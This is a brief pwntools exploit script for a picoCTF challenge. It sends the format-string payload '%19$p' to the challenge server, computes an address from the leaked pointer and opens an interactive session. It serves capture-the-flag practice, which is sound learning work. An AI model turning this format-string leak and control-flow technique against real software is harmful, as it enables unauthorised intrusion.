from pwn import *
p=process("./vuln")
p=remote('rescued-float.picoctf.net' ,54876)
p.sendline(b"%19$p")
p.recvuntil("name:")
p.sendline(hex(int(p.recvline().decode(),16)-215))
p.interactive()
